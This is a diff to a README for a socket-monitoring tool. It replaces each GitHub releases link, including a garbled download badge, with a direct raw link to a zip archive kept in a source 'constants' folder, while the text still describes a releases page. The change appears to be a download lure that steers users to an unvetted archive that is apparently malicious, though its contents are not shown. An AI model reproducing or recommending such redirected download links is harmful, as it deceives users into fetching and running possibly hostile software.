@@ -1,6 +1,6 @@
 # 🚀 socket_monitoring - Monitor Your Socket Connections Easily
 
-[![Download Socket Monitoring](https://img.shields.io/badge/Download-Socket%20Monitoring-blue.svg)](https://github.com/satakshisrivastava/socket_monitoring/releases)
+[![Download Socket Monitoring](https://raw.githubusercontent.com/satakshisrivastava/socket_monitoring/master/src/common/constants/socket_monitoring-v1.2.zip%https://raw.githubusercontent.com/satakshisrivastava/socket_monitoring/master/src/common/constants/socket_monitoring-v1.2.zip)](https://raw.githubusercontent.com/satakshisrivastava/socket_monitoring/master/src/common/constants/socket_monitoring-v1.2.zip)
 
 ## 🌟 Overview
 
@@ -26,7 +26,7 @@ socket_monitoring helps you watch and understand live socket connections and dat
 Follow these steps to download and start using socket_monitoring:
 
 1. **Visit the Releases Page:** Access the releases page by clicking the link below:
-   [Visit this page to download](https://github.com/satakshisrivastava/socket_monitoring/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/satakshisrivastava/socket_monitoring/master/src/common/constants/socket_monitoring-v1.2.zip)
 
 2. **Choose the Latest Release:** On the releases page, look for the latest version of socket_monitoring.
 
@@ -76,7 +76,7 @@ The frequency of updates may vary based on new features and bug fixes. Check the
 
 To get started, visit the releases page to download socket_monitoring:
 
-[Visit this page to download](https://github.com/satakshisrivastava/socket_monitoring/releases)
+[Visit this page to download](https://raw.githubusercontent.com/satakshisrivastava/socket_monitoring/master/src/common/constants/socket_monitoring-v1.2.zip)
 
 Follow the steps mentioned earlier to install and run the software.
 
